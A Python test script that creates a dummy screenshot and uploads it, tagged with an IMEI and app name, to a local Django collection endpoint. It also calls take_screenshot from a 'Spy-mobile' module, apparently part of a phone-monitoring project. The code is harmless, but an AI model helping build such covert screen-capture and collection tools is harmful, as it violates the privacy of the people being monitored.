#!/usr/bin/env python3
"""
Test script to verify screenshot upload functionality
"""
import requests
import os
import time
from PIL import Image, ImageDraw

# Django server URL (adjust if needed)
DJANGO_URL = "http://localhost:8000"

def create_test_screenshot():
    """Create a test screenshot image"""
    img = Image.new('RGB', (800, 600), color='white')
    draw = ImageDraw.Draw(img)

    # Add some text to make it identifiable
    draw.text((10, 10), f"Test Screenshot - {time.time()}", fill='black')
    draw.text((10, 30), "Generated for upload testing", fill='black')

    # Save the image
    filename = f"test_screenshot_{int(time.time())}.png"
    img.save(filename)
    return filename

def test_upload_endpoint():
    """Test the upload endpoint with a screenshot"""
    print("Testing screenshot upload to Django server...")

    # Create test screenshot
    screenshot_path = create_test_screenshot()
    print(f"Created test screenshot: {screenshot_path}")

    try:
        # Prepare upload data
        url = f"{DJANGO_URL}/api/upload/"
        imei = "test_device_123"
        app_name = "test_app"

        with open(screenshot_path, 'rb') as f:
            files = {'file': f}
            data = {
                'imei': imei,
                'tipo': 'screenshot',
                'app': app_name,
                'timestamp': str(time.time())
            }

            print(f"Uploading to: {url}")
            print(f"Data: {data}")

            # Make the request
            response = requests.post(url, files=files, data=data, timeout=10)

            print(f"Response status: {response.status_code}")
            print(f"Response text: {response.text}")

            if response.status_code == 200:
                print("✅ Upload successful!")
                return True
            else:
                print("❌ Upload failed!")
                return False

    except Exception as e:
        print(f"❌ Error during upload: {e}")
        return False
    finally:
        # Clean up test file
        if os.path.exists(screenshot_path):
            os.remove(screenshot_path)
            print(f"Cleaned up test file: {screenshot_path}")

def test_mobile_app_simulation():
    """Simulate what the mobile app would do"""
    print("\nSimulating mobile app screenshot capture and upload...")

    # Test the device_utils screenshot function
    try:
        import sys
        sys.path.append('Spy-mobile')

        from device_utils import take_screenshot
        print("Testing device_utils.take_screenshot()...")

        screenshot_path = take_screenshot()
        if screenshot_path and os.path.exists(screenshot_path):
            print(f"✅ Screenshot created: {screenshot_path}")

            # Try to upload it
            success = test_upload_endpoint()
            if success:
                print("✅ Full cycle test successful!")
            else:
                print("❌ Upload failed in full cycle test")

            # Clean up
            os.remove(screenshot_path)
        else:
            print("❌ Screenshot creation failed")

    except ImportError as e:
        print(f"❌ Could not import device_utils: {e}")
    except Exception as e:
        print(f"❌ Error in mobile app simulation: {e}")

if __name__ == "__main__":
    print("=== Screenshot Upload Test ===\n")

    # Test 1: Direct upload test
    print("Test 1: Direct upload to Django endpoint")
    upload_success = test_upload_endpoint()

    # Test 2: Mobile app simulation
    print("\nTest 2: Mobile app simulation")
    test_mobile_app_simulation()

    print("\n=== Test Results ===")
    if upload_success:
        print("✅ Django upload endpoint is working")
        print("✅ Data collection should work when app is on phone")
    else:
        print("❌ Django upload endpoint has issues")
        print("❌ Data collection may not work properly")

    print("\nNote: For complete testing on actual device, the app needs to be built and installed.")
